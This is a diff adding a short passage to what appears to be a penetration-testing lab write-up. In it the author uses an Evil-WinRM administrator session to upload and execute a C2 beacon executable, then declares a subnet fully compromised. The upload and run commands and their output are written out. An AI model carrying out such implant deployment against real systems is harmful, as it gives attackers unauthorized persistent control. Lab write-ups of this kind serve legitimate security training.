@@ -557,4 +557,32 @@ So now i have access via winrm i can setup a beacon and upload and execute!
 
 I now have the beacon i just need to upload
 
+```python
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload dc-ext-agent.x64.exe
+                                        
+Info: Uploading /home/kali/hsm/darkhaven/dc-ext-agent.x64.exe to C:\Users\Administrator\Documents\dc-ext-agent.x64.exe
+                                        
+Data: 120148 bytes of 120148 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
+
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2/27/2026  12:23 AM                WindowsPowerShell
+-a----         4/19/2026   4:14 PM          90112 dc-ext-agent.x64.exe
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc-ext-agent.x64.exe
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
+```
+I should now have a c2 session as the administrator
+
+![](Pasted%20image%2020260419171502.png)
+
+So that is now Subnet 1 fully compromised
 
